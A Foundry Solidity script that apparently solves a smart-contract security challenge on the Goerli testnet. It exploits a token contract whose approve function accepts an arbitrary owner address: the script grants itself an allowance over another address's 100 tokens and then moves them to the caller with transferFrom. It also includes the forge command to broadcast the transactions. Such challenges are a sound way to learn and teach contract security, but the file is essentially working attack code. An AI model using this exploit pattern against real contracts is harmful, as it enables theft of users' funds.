// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {VToken} from "../src/Challenge0.VToken.sol";

//Execute
//forge script script/Challenge0.s.sol:Challenge0Script --rpc-url $GOERLI_RPC_URL --broadcast --private-key $PRIVATE_KEY --verify --etherscan-api-key $ETHERSCAN_KEY
contract Challenge0Script is Script {
    function setUp() public {}

    function run() public {

        console.log("####1");
        vm.startBroadcast();
        console.log(msg.sender);

        VToken token = VToken(0x0D5236eD36cF017fc73b65520E1779456c431409);
        token.approve(0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045, msg.sender, 100 ether);
        token.transferFrom(0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045, msg.sender, 100 ether);
        // address(token).call(abi.encodeWithSignature("approve(address,address,uint256)", 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045, msg.sender, 100 ether));
        console.log("####2");
        // address(token).call(abi.encodeWithSignature("transferFrom(address,address,uint256)", 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045, msg.sender, 100 ether));
        
        console.log("####3");
        console.log(address(0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045).balance);
        //console.log(token.balanceOf(msg.sender));
        console.log("####4");
        vm.stopBroadcast();
        
        console.log("####5");

    }
}